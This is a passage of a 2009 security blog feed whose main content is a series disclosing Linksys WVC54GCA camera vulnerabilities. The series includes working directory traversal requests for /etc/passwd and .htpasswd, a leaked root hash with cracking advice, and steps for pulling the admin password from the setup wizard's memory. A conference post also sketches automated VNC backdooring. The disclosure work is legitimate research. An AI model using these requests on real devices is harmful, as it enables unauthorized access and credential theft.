+		<comments>http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-3/#comments</comments>
+		<pubDate>Thu, 23 Apr 2009 00:52:28 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[camera]]></category>
+		<category><![CDATA[embedded]]></category>
+		<category><![CDATA[linksys]]></category>
+		<category><![CDATA[vulnerability]]></category>
+
+		<guid isPermaLink="false">https://www.gnucitizen.org/?p=3019</guid>
+		<description><![CDATA[This article is a continuation of the following GNUCITIZEN articles, which include an introduction to the topic and also some initial observations: Hacking Linksys IP Cameras (pt 1), Hacking Linksys IP Cameras (pt 2).
+
+Unlike the previous two vulnerabilities I released, the vulnerabilities I&#8217;m releasing in this post are perhaps not so useful to break into the device as you need access to the admin account to exploit them. [...]]]></description>
+			<content:encoded><![CDATA[<p><em>This article is a continuation of the following GNUCITIZEN articles, which include an introduction to the topic and also some initial observations: <a href="http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-1/">Hacking Linksys IP Cameras (pt 1)</a>, <a href="http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-2/">Hacking Linksys IP Cameras (pt 2)</a>.</em></p>
+
+<p>Unlike the <a href="http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-1/">previous</a> <a href="http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-2/">two</a> vulnerabilities I released, the vulnerabilities I&#8217;m releasing in this post are perhaps not so useful to break into the device as you need access to the admin account to exploit them. Nevertheless, these vulnerabilities might be useful for users who want to hack their Linksys IP cameras for modding purposes, rather than being used by an attacker aiming to crack into someone else&#8217;s camera.</p>
+
+<h3>Two directory traversal vulnerabilities</h3>
+
+<p>Today, instead of releasing just one vulnerability I&#8217;ll be releasing two! These two vulnerabilities have helped me understand more about how the WVC54GCA wireless camera internals and I&#8217;m hoping they will also work on other Linksys camera models. Please let me know if you successfully test them on other models too!</p>
+
+<p>Both vulnerabilities are of type directory traversal, aka arbitrary file retrieval, and they both affect the same CGI program: <code>/adm/file.cgi</code>. Please note that these vulnerabilities are different to <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2507">CVE-2004-2507</a>/<a href="http://www.securityfocus.com/bid/10476/exploit">BID 10476</a> which affected <code>/main.cgi</code> instead.</p>
+
+<h4>1st directory traversal hole</h4>
+
+<p>It seems that the <code>next_file</code> parameter is not filtered enough when submitted to <code>/adm/file.cgi</code>, so that either of the following requests will return the content of any file whose location is known (<code>/etc/passwd</code> in this case):</p>
+
+<pre><code>/adm/file.cgi?next_file=%2fetc%2fpasswd</code></pre>
+<pre><code>/adm/file.cgi?next_file=%2fetc/passwd</code></pre>
+<pre><code>/adm/file.cgi?next_file=%2e.%2f%2e.%2f%2e.%2f%2e.%2fetc%2fpasswd</code></pre>
+
+<h4>2nd directory traversal hole</h4>
+
+<p>In the case of the second directory traversal hole, the vulnerable parameter (<code>this_file</code>) is not filtered at all whatsoever. So hex-encoding special symbols is <em>not</em> required:</p>
+
+<pre><code>/adm/file.cgi?todo=pwnage&#038;this_file=/etc/passwd</code></pre>
+
+<p>The following is the content of the Linux <code>passwd</code> file containing the encrypted root password. Remember that the WVC54GCA comes with BusyBox Linux by default which you can confirm by opening <code>bin/busybox</code> with any of the vulnerabilities previously discussed. I&#8217;m curious to know if the <code>passwd</code> file contains the same password on all cameras of the same model, or even if Linksys is also using the same password on other models:</p>
+
+<pre><code>root:9szj4G6pgOGeA:0:0:root:/root:/bin/sh</code></pre>
+
+<p>Notice that when exploiting the first vulnerability, we need to convert forward slashes to <code>%2f</code> which is its hex-encoding equivalent. This is because the developer (poorly) attempted to filter directory traversal sequences when data is submitted via the <code>next_file</code> parameter. In the third example, we also partially hex-encode <code>../</code> sequences in order to avoid being blocked by the script which results in a forbidden error.</p>
+
+<p>Needless to say, if the root password is not too strong you should be able to crack it using <a href="http://www.openwall.com/john/">john</a> or you favorite password cracking tool. I loaded passwd with john for a few hours on an old laptop and nothing was found, so I&#8217;m guessing the root password is not extremely weak. If you model comes with the telnet daemon running by default, cracking that password should give you root shell access.</p>
+
+<p>Unfortunately, as I mentioned in the <a href="http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-1/">first post</a> of these series, the WVC54GCA camera comes with a telnet daemon included, but it&#8217;s off by default. I haven&#8217;t managed to enable the telnet daemon and get a remote root shell yet although I suspect it might be possible by <a href="http://brooknet.no-ip.com/~lex/public/WVC54G/">modifying</a> the bin firmware image and uploading it again.</p>
+
+<h4>What can we do with these vulnerabilities?</h4>
+
+<p>Well, I tried finding files that contain interesting information that helps you understand the camera better. The following are some examples:</p>
+
+<ul>
+<li><code>/etc/passwd</code> : traditional-DES-format password file with no salt</li>
+<li><code>/usr/local/www/img/.htpasswd</code> : HTTP credentials stored in cleartext</li>
+<li><code>/usr/local/www/adm/.htpasswd</code> : contains same data as previous file</li>
+<li><code>/etc/system.conf</code> : all camera settings stored in cleartext including admin password, wifi encryption key, etc &#8230;</li>
+<li><code>/usr/local/bin/thttpd.conf</code> : web server config file confirming the daemon runs as root, which is the only system account present anyway</li>
+<li><code>/etc/init.d/rcS</code>  :  here we see the line that starts the telnet daemon (<code>/usr/sbin/telnetd</code>) commented out</li>
+<li><code>/etc/def_sys.conf</code> : camera&#8217;s default settings</li>
+<li><code>/etc/system.conf</code> : camera&#8217;s current settings</li>
+<li><code>/var/nc.log</code> : network connections logs</li>
+<li><code>/etc/group</code></li>
+<li><code>/etc/inittab</code></li>
+<li><code>/proc/cpuinfo</code> : processor details</li>
+<li><code>/proc/meminfo</code></li>
+<li><code>/proc/version</code> : OS details</li>
+<li><code>/proc/uptime</code></li>
+</ul>
+
+<p>Finding a file upload vulnerability should allow us to overwrite the <code>/etc/init.d/rcS</code> file and eventually manage to start the telnet server after reboot. By overwriting the <code>/etc/passwd</code> file with our own we should be able to add our own root password. Unfortunately, I haven&#8217;t discovered any vulnerability that would allow me to upload files to arbirary locations. If you do discover one, please let me know. I&#8217;d love to hear the details.</p>
+
+<h3>Testing Info</h3>
+
+<p>Directory traversal vuln #1 successfully tested on:</p>
+<p><ul>
+<li>WVC54GCA</li>
+<li>Firmware V1.00R22 and V1.00R24 (latest available as on 23rd April 2009)</li>
+</ul>
+
+<p>Directory traversal vuln #2 successfully tested on:</p>
+<p><ul>
+<li>WVC54GCA</li>
+<li>V1.00R24 (latest available as on 23rd April 2009)</li>
+</ul>
+<p>Although I never tested the second traversal vulnerability on Firmware V1.00R22, I definitely suspect it will work on this previous firmware version as well.</p>
+<p><em>Please note that the aforementioned vulnerabilities are different to <a href="http://www.securityfocus.com/bid/10476/exploit">BID 10476</a> which affected the <code>/main.cgi</code> program rather than <code>/adm/file.cgi</code>.</em></p><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-3/feed/</wfw:commentRss>
+		<slash:comments>28</slash:comments>
+		</item>
+		<item>
+		<title>Hacking Linksys IP Cameras (pt 2)</title>
+		<link>http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-2/</link>
+		<comments>http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-2/#comments</comments>
+		<pubDate>Mon, 20 Apr 2009 22:27:14 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[camera]]></category>
+		<category><![CDATA[linksys]]></category>
+		<category><![CDATA[vulnerability]]></category>
+
+		<guid isPermaLink="false">https://www.gnucitizen.org/?p=2978</guid>
+		<description><![CDATA[This article is a continuation of the following GNUCITIZEN article, which includes an introduction to the topic and also some initial observations: Hacking Linksys IP Cameras (pt 1).
+
+Privilege escalation via arbitrary file retrieval
+
+The second vulnerability I&#8217;ll be releasing is an arbitrary(ish) file retrieval vulnerability. It&#8217;s not fully arbitrary because you can only retrieve the contents of files located within the same directory where the vulnerable CGI program is located. [...]]]></description>
+			<content:encoded><![CDATA[<p><em>This article is a continuation of the following GNUCITIZEN article, which includes an introduction to the topic and also some initial observations: <a href="http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-1/">Hacking Linksys IP Cameras (pt 1)</a>.</em></p>
+
+<h3>Privilege escalation via arbitrary file retrieval</h3>
+
+<p>The second vulnerability I&#8217;ll be releasing is an arbitrary(ish) file retrieval vulnerability. It&#8217;s not fully arbitrary because you can only retrieve the contents of files located within the same directory where the vulnerable CGI program is located. However, this is enough to allow a neat privilege escalation vector where a restricted user that only has permissions to view the video stream, can gain access to the <code>admin</code> account password.</p>
+
+<p>The problem lies within the <code>next_file</code> parameter which is submitted to the <code>main.cgi</code> program. Although <code>main.cgi</code> <em>does</em> filter characters typically used in directory traversal sequences such as dots (<code>.</code>) and forward slashes (<code>/</code>), it seems that the developer didn&#8217;t consider that retrieving the contents of files within the current directory could create a security hole. By simply retrieving the contents of <code>.htpasswd</code> a restricted user which only has permissions to access the video stream can access the credentials of the <code>admin</code> account and also the credentials of other restricted users (if applicable).</p>
+
+<p>The only restriction that needs to be bypassed, is dots (<code>.</code>) symbols being filtered. i.e.: the following will <em>not</em> work and will result in a forbidden error:</p>
+
+<pre><code>/img/main.cgi?next_file=.htpasswd</code></pre>
+
+<p>But replacing the dot (<code>.</code>) symbol with its hexadecimal equivalent:</p>
+
+<pre><code>/img/main.cgi?next_file=%2ehtpasswd</code></pre>
+
+<p>Will result in the contents of <code>.htpasswd</code> being returned. i.e.:</p>
+
+<pre><code>admin:adminpassw0rd user1:pass1 user2:pass2</code></pre>
+
+<p>Like most IP cameras, the Linksys WVC54GCA allows administrators to grant access to the video stream to selected users only (rather than anonymous users who don&#8217;t need to authenticate). In this case, the admin user can click on the <code>Users</code> menu and tick the <code>Only users in database</code> option (please see screenshot below). After this, all that is needed is to add a username/password pair for the account to grant video-viewing access to:</p>
+
+<div class="screen"><img src="http://www.gnucitizen.org/static/blog/2009/04/video_user_accounts.png" alt="Video User Accounts" title="Video User Accounts" width="489" height="227" class="alignnone size-full wp-image-2990" /></div>
+
+<p>Well, the feature discussed above can be rendered useless by exploiting the vulnerability I have described, since it allows restricted users to retrieve the admin password.</p>
+
+<h3>Testing Info</h3>
+
+<p>Successfully tested on:</p>
+<p><ul>
+<li>WVC54GCA</li>
+<li>Firmware V1.00R22 and V1.00R24 (latest available as on 20th April 2009)</li>
+</ul>
+
+<p><em>Please note that this vulnerability is different to <a href="http://www.securityfocus.com/bid/10476/exploit">BID 10476</a> which affected the <code>/main.cgi</code> program rather than <code>/img/main.cgi</code>.</em></p><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-2/feed/</wfw:commentRss>
+		<slash:comments>15</slash:comments>
+		</item>
+		<item>
+		<title>Hacking Linksys IP Cameras (pt 1)</title>
+		<link>http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-1/</link>
+		<comments>http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-1/#comments</comments>
+		<pubDate>Mon, 20 Apr 2009 07:40:35 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[camera]]></category>
+		<category><![CDATA[embedded]]></category>
+		<category><![CDATA[linksys]]></category>
+		<category><![CDATA[project]]></category>
+		<category><![CDATA[research]]></category>
+		<category><![CDATA[vulnerability]]></category>
+
+		<guid isPermaLink="false">https://www.gnucitizen.org/?p=2899</guid>
+		<description><![CDATA[During the easter break, I was playing with my my wireless Linksys IP camera which, although I bought several months ago, I hadn&#8217;t taken my time to give the attention this beauty deserves until now! :)
+
+The model in particular is the WVC54GCA, which I would say is one of the most affordable Wi-Fi IP cameras out there (about GBP 80 in the UK), making it a great toy to tinker with. [...]]]></description>
+			<content:encoded><![CDATA[<p>During the easter break, I was playing with my my wireless Linksys IP camera which, although I bought several months ago, I hadn&#8217;t taken my time to give the attention this beauty deserves until now! :)</p>
+
+<p>The model in particular is the <a href="http://www.linksysbycisco.com/US/en/products/WVC54GCA">WVC54GCA</a>, which I would say is one of the most affordable Wi-Fi IP cameras out there (about GBP 80 in the UK), making it a great toy to tinker with. I found the camera to be quite good functionalities-wise, although I&#8217;ve experienced availability problems with it. It seems the camera freezes every once in a while. Well, this is true at least when you heavily customized its configuration which is what I&#8217;ve ultimately done after playing so much with it.</p>
+
+<p>I&#8217;ve loved playing with embedded devices for a while, and as a security researcher I find it quite an interesting topic as many <q>de facto</q> security principles that are usually (attempted to be) followed when designing other types of systems are <em>not</em> often applied to embedded devices. This, I believe is due to lack of limitations in hardware resources, and lack of awareness on consequences of getting a miscellaneous device compromised. i.e.: <q>who cares if my IP camera gets owned?</q></p>
+
+<p><em>During the next days, I&#8217;ll be posting some vulnerabilities I&#8217;ve found. Some of them are fun and serious, while others you might find kind of boring</em>.</p>
+
+<h3>Meet the target</h3>
+
+<p>You can learn a lot about the specs of a device by simply reading the product&#8217;s literature. However, sometimes not enough info is provided in these documents. The following are some of the specs I confirmed by interacting with the camera in various ways:</p>
+
+<ul>
+<li>CPU: <code>Faraday FA526id(wb) rev 1 (v4l)</code> according to <code>/proc/cpuinfo</code></li>
+<li>OS: <code>Linux version 2.4.19-pl1029</code> according to <code>/proc/version</code> plus Busybox (confirmed as the file <code>/bin/busybox</code> exists on the filesystem)</li>
+<li>HTTPD: <code>thttpd 2.25b</code> (extracted from banner returned on default html error pages and &#8216;Server:&#8217; HTTP headers)</li>
+<li>Memory: 30908kB (32 MB?) according to <code>/proc/meminfo</code></li>
+<li>Firmware Version: V1.00R22 and <a href="http://downloads.linksysbycisco.com/downloads/WVC54GCA_FW_100R24,0.zip">V1.00R24</a> (latest version available as on 16th April 2009)</li>
+</ul>
+
+<p>It also comes with a telnet daemon (<code>/usr/sbin/telnetd</code>) but unfortunately for hackers out there, the daemon is disabled as the following line is commented out on <code>/etc/init.d/rcS</code>:</p>
+
+<pre><code># ---- Start Telnet Server (debug) ---- #<br />
+#/usr/sbin/telnetd &#038;</code></pre>
+
+<p>I have not yet managed to get a remote root shell by enabling the telnet daemon but have found some vulnerabilities which might help accomplishing this goal. I will be releasing these vulnerabilities in the next days. Please let me know if you know how to enable the telnet daemon on Linksys IP cameras! Ideally, I&#8217;d like to accomplish this without physically connecting to the camera or flashing the firmware.</p>
+
+<h3>Remote admin compromise by unauthenticated attackers due to wizard design error</h3>
+
+<p>I found this vulnerability while investigating <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4390">CVE-2008-4390</a>. I wanted to know if CVE-2008-4390 affected my camera, even though it was reported to affect a different Linksys IP camera firmware and model. The CVE entry states:</p>
+
+<blockquote>The Cisco Linksys WVC54GC wireless video camera before firmware 1.25 sends cleartext configuration data in response to a Setup Wizard remote-management command, which allows remote attackers to obtain sensitive information such as passwords by sniffing the network.</blockquote>
+
+<p>So I started trying to figure out if the WVC54GCA also discloses sensitive information when communicating with the <a href="http://downloads.linksysbycisco.com/downloads/WVC54GCA-CD-Content-10-25-2007_SetupWiz.zip">wizard</a>. <a href="http://www.kb.cert.org/vuls/id/MAPG-7HJKSA">According to the vendor</a>, the issue has been fixed:</p>
+
+<blockquote>Solution: 2300 and 210 have encrypted data and have no such issue. To decode the data, an administrator username/password is a MUST.</blockquote>
+
+<p>At first sight, when capturing the traffic between the wizard and the cam, I couldn&#8217;t see the data traveling in human readable form. While trying to figure out how the data is sent over the network (i.e.: encoded/encrypted), I realized there was something seriously wrong with the handshake mechanism.</p>
+
+<p>The following is a very generic (and possibly inaccurate) description of the handshake</p>
+
+<ol>
+<li>Wizard (<code>SetupWizard.exe</code>) sends UDP request to <code>255.255.255.255:916</code></li>
+<li>Camera responds back to <code>255.255.255.255</code> using the <a href="http://en.wikipedia.org/wiki/DCE/RPC">DCERPC</a> protocol and presents itself with identity info such as the value of the <code>defname</code> variable which looks like <code>LKXXXXXX</code>, where <code>X</code> is a hex digit. This identity info is picked up by <code>SetupWizard.exe</code>. Some of this info such as MAC address, IP address and subnet mask is shown in the wizard.</li>
+<li>From now on, <code>SetupWizard.exe</code> uses the camera&#8217;s <code>defname</code> variable when talking to it, so that the camera knows what requests submitted to <code>255.255.255.255:916</code> it should respond to.</li>
+</ol>
+
+<p>At this point the wizard has discovered the camera and the user can go through the setup procedure. For security reasons, the user needs to enter the admin username and password, before the setup process can start. Otherwise anyone could make changes to the camera without authenticating.</p>
+
+<p>Now, here is the important bit. If you capture the network traffic while running <code>SetupWizard.exe</code>, you&#8217;ll notice that when the user is asked to enter the admin username and password after the camera is discovered, there are NO requests sent from the wizard to the camera in order to verify that the entered username/password combination is correct!</p>
+
+<p><q>How is this possible? What the heck is going on?!</q> I thought. I was terrified to confirm my worst fear: the wizard already knows the camera&#8217;s admin username and password at this point, thus there is no need to ask the camera again. Indeed, at this point &#8211; <em>before the user enters the admin username and password</em> that is &#8211; the camera&#8217;s credentials are already loaded into the memory of the <code>SetupWizard.exe</code> process. This is because the camera  has previously transfered the admin credentials along with other configuration data!</p>
+
+<p>In case I didn&#8217;t explain myself properly I&#8217;ll summarize the issue by saying that the camera transfers the admin username and password to the wizard before the user enters them. The following steps demonstrate how an unauthenticated attacker can remotely obtain the camera&#8217;s admin username and password:</p>
+
+<ol>
+<li>Download the <a href="http://downloads.linksysbycisco.com/downloads/WVC54GCA-CD-Content-10-25-2007_SetupWiz.zip">setup wizard</a>. You might need to download a different wizard if you want to test this vulnerability on a different Linksys IP camera model</li>
+<li>Run <code>SetupWizard.exe</code></li>
+<li>Click on <code>Click Here to Start / Setup Camera / Next</code> (after accepting EULA) / <code>Next</code> (4 more times in total)</li>
+<li>The discovery process is quite flaky, so if the wizard hasn&#8217;t found your camera yet, click on <code>Search Again</code> as many times as required until it works</li>
+<li>You should now see your camera&#8217;s name under the <code>Camera List</code> column and also various configuration data under the <code>Status</code> column:
+<div class="screen"><img src="http://www.gnucitizen.org/static/blog/2009/04/wizard_cam_discovery-300x225.png" alt="Wizard Cam Discovery" title="Wizard Cam Discovery" width="300" height="225" class="alignnone size-medium wp-image-2922" /></div></li>
+<li>You now need to dump the process memory of <code>SetupWizard.exe</code> using your favorite <a href="http://www.ntsecurity.nu/toolbox/pmdump/">tool</a>:
+<div class="screen"><img src="http://www.gnucitizen.org/static/blog/2009/04/setupwizardexe_mem_dump_21-300x166.png" alt="setupwizardexe Mem Dump 2" title="setupwizardexe Mem Dump 2" width="300" height="166" class="alignnone size-medium wp-image-2926" /></div></li>
+<li>Then open the memory dump file using your favorite <a href="http://www.chmaas.handshake.de/delphi/freeware/xvi32/xvi32.htm">hex editor</a></li>
+<li>Now you can either search for <em>admin</em> and find the admin password after a few null bytes, or tell your hex editor to go to decimal position 75058 (<code>Address / Goto ...</code> menu on XVI32). In my case the admin password would always fall within this position:
+<div class="screen"><img src="http://www.gnucitizen.org/static/blog/2009/04/admin_password_extraction1-300x217.png" alt="Admin Password Extraction 1" title="Admin Password Extraction 1" width="300" height="217" class="alignnone size-medium wp-image-2945" />
+<img src="http://www.gnucitizen.org/static/blog/2009/04/admin_password_extraction_2-300x216.png" alt="Admin Password Extraction 2" title="Admin Password Extraction 2" width="300" height="216" class="alignnone size-medium wp-image-2947" /></div></li>
+<li>Have fun! (the most important step really)</li>
+</ol>
+
+<p>It is somehow ironic that a free tool provided by the vendor of a product can be used as a hacker tool against their own product.</p>
+
+<p><em>As far as I know, this vulnerability cannot be exploited over the Internet, since the camera only responds to wizards located in the same LAN. Never say never though, so if you find a way to exploit this vulnerability over the Internet, please <a href="http://www.gnucitizen.org/contact/">contact</a> us.</em></p>
+
+<p><strong>UPDATE</strong>: CPU and additional OS info added.</p><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-1/feed/</wfw:commentRss>
+		<slash:comments>30</slash:comments>
+		</item>
+		<item>
+		<title>CONFidence 2009 coming up soon!</title>
+		<link>http://www.gnucitizen.org/blog/confidence-2009-coming-up-soon/</link>
+		<comments>http://www.gnucitizen.org/blog/confidence-2009-coming-up-soon/#comments</comments>
+		<pubDate>Sat, 14 Mar 2009 13:47:47 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[con]]></category>
+		<category><![CDATA[conference]]></category>
+		<category><![CDATA[CONFidence]]></category>
+		<category><![CDATA[krakow]]></category>
+		<category><![CDATA[security]]></category>
+
+		<guid isPermaLink="false">https://www.gnucitizen.org/?p=2773</guid>
+		<description><![CDATA[The new edition of CONFidence is coming up soon! CONFidence, which has become one of the biggest technical IT security conferences in Europe, is taking place on 15-16 May in the beautiful city of Krakow.
+
+
+
+This is the fifth year CONFidence is taking place, and there have been several changes introduced. First of all there will be two simultaneous tracks after lunch time, whereas previous editions only offered one track all day. [...]]]></description>
+			<content:encoded><![CDATA[<p>The new edition of <a href="http://2009.confidence.org.pl/">CONFidence</a> is coming up soon! CONFidence, which has become one of the biggest technical IT security conferences in Europe, is taking place on 15-16 May in the beautiful city of <a href="http://en.wikipedia.org/wiki/Krak%C3%B3w">Krakow</a>.</p>
+
+<div class="screen"><a href="http://www.gnucitizen.org/static/blog/2009/03/confidence.png"><img src="http://www.gnucitizen.org/static/blog/2009/03/confidence.png" title="CONFidence 2009"/></a></div>
+
+<p>This is the fifth year CONFidence is taking place, and there have been several changes introduced. First of all there will be two simultaneous tracks after lunch time, whereas previous editions only offered one track all day. Also, this year introduced the <strong>Hackers&#8217; Squad</strong>, which sounds to me like a great idea for learning and having fun at the same time. The following is mentioned on the CONFidence website regarding the Hackers&#8217; Squad:</p>
+
+<blockquote><p>During 5th edition of CONFidence you have a unique chance to stay at the coolest spot in the city Hackers&#8217; Squad. It is a place where hacking never stops!</p>
+
+<p>We decided to rent the whole hostel (or even group of hostels if it&#8217;s necessary) and turn it into the real hacking space a place to sleep, to party and to hack &#8211; only for CONFidence attendees.</p></blockquote>
+
+<p>Last year pdp and I had a blast at the event, which we found to be one of the best organized security cons we&#8217;ve been too. To date, I can say that CONFidence and <a href="http://conference.hackinthebox.org/">HITBSecConf</a> &#8211; aka Hack in the Box &#8211; are probably my two favorite hacker events. Unfortunately, pdp won&#8217;t be speaking at CONFidence this year, but he will be busy presenting at other events such as <a href="http://conference.auscert.org.au/conf2009/">AusCERT 2009</a>.</p>
+
+<h3>My humble talk on credit card theft</h3>
+
+<p>I&#8217;d like to personally thank Andrzej Targosz for inviting me to speak this year, making it the second time I&#8217;ll deliver a presentation at CONFidence. I hope my presentation will be interesting and entertaining enough for the audience. This is the abstract for my talk:</p>
+
+<blockquote><p>You are a security geek, you specialize in pentesting, but somehow during your career you&#8217;ve had to deal with PCI DSS. Yes, PCI DSS can be very boring, I feel your pain! Pentesters usually don&#8217;t like standards because they understand that there is only so much they can do to help organizations protect their information assets. On top of that, pentesters usually like to experiment which goes against the principle of boring audit checklists.</p>
+
+<p>In this presentation, we will cover PCI DSS and credit card security from a (hopefully) fun perspective, with a focus on credit card theft techniques. How are merchants and service providers being compromised? How about us consumers? What loopholes currently exist in the PCI DSS standards which still allow unsophisticated attackers to compromise credit card data?</p>
+
+<p>This presentation is <em>not</em> brought to you by a PCI DSS expert, but rather a frustrated pentester who will attempt to show you that PCI DSS and credit card security in general can be a fun topic! Knowledge learned from performing pentests and from working with QSAs who have assessed compromised data centers will be shared.</p></blockquote>
+
+<p>Of course, if you have any thoughts on things you think I should cover in my presentation I&#8217;m all ears!</p>
+
+<h3>Talks I&#8217;m interested in</h3>
+
+<p>I must say that there are quite a few presentations that look interesting, but it was <a href="http://2009.confidence.org.pl/prelegenci/rich-smith">Rich Smith</a>&#8216;s abstract on attacking VNC that caught my eye the most.</p>
+
+<p>The reason why I&#8217;m interested in this talk is because Rich is basically answering a question I asked myself a long time ago when the infamous <a href="http://www.securityfocus.com/archive/1/433994/30/0/threaded">VNC auth bypass vuln</a> was discovered: can we programmatically run commands via the Remote Frame Buffer (RFB) protocol which VNC relies on? It seems that Rich has done a heck of a job at answering this question!</p>
+
+<p>I remember exploiting the VNC auth bypass bug during pentest assessments. Basically, once you gained access to the desktop two things could happen: 1) the screen is locked and you&#8217;re stuck, 2) the screen is unlocked and you gain access to the currently-logged-in user&#8217;s session.</p>
+
+<p>In the second case, you can obviously do anything including running commands of course. So if the logged-in user has admin privileges on the box, it&#8217;s a full compromise pretty much. However, the attack can be very noisy, since the attacker is graphically interacting with the desktop. For instance, imagine if the admin was physically sitting in front of the compromised system while watching someone else opening the command prompt, etc. Another scenario which can arouse suspicion is the admin remotely VNCing into the box. If the attacker also connects via VNC to the same box, that would kill the admin&#8217;s VNC session. Quite noisy as you can imagine.</p>
+
+<p>So my question back then was, <em>could someone programmatically compromise a box via VNC and then launch a malicious payload?</em> i.e.: adding a new OS account. I must say that I dug a bit back then and it&#8217;s not as trivial as it sounds, which is what Rich is arguing in his presentation, although he did manage to write a python library and suite of tools for automating tasks like this.</p>
+
+<p>Think of the following automatic task:</p>
+<ol>
+	<li>scan boxes for blank VNC passwords</li>
+	<li>if blank pass allowed, then backdoor system</li>
+	<li>continue scanning</li>
+</ol>
+
+<p><em>Fun indeed!</em></p><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/confidence-2009-coming-up-soon/feed/</wfw:commentRss>
+		<slash:comments>3</slash:comments>
+		</item>
+		<item>
+		<title>New Version of dnsmap out!</title>
+		<link>http://www.gnucitizen.org/blog/new-version-of-dnsmap-out/</link>
+		<comments>http://www.gnucitizen.org/blog/new-version-of-dnsmap-out/#comments</comments>
+		<pubDate>Sun, 22 Feb 2009 16:42:19 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[bruteforce]]></category>
+		<category><![CDATA[bruteforcing]]></category>
+		<category><![CDATA[DNS]]></category>
+		<category><![CDATA[dnsmap]]></category>
+		<category><![CDATA[enumeration]]></category>
+
+		<guid isPermaLink="false">https://www.gnucitizen.org/?p=2622</guid>
+		<description><![CDATA[We just released a new version of dnsmap. dnsmap is a subdomain bruteforcer for stealth enumeration.
+
+Originally released in 2006, dnsmap is mainly meant to be used by pentesters during the information gathering/enumeration phase of infrastructure security assessments. During the enumeration stage, the security consultant would typically discover the target company&#8217;s IP netblocks, domain names, phone numbers, etc. [...]]]></description>
+			<content:encoded><![CDATA[<p>We just released a new version of <a href="http://www.gnucitizen.org/static/blog/2009/03/dnsmap-0222tar.gz">dnsmap</a>. dnsmap is a subdomain bruteforcer for stealth enumeration.</p>
+
+<p>Originally released in 2006, dnsmap is mainly meant to be used by pentesters during the information gathering/enumeration phase of infrastructure security assessments. During the enumeration stage, the security consultant would typically discover the target company&#8217;s IP netblocks, domain names, phone numbers, etc. dnsmap was <a href="http://backtrack.offensive-security.com/index.php?title=Tools">included</a> in Backtrack 2 and 3, although the version included is the now dated version 0.1.</p>
+
+<p>Subdomain brute-forcing is another technique that should be used in the enumeration stage, as it&#8217;s especially useful when other domain enumeration techniques such as zone transfers don&#8217;t work (I rarely see zone transfers being publicly allowed these days by the way).</p>
+
+<h3>Original Features of Version 0.1</h3>
+
+<ul>
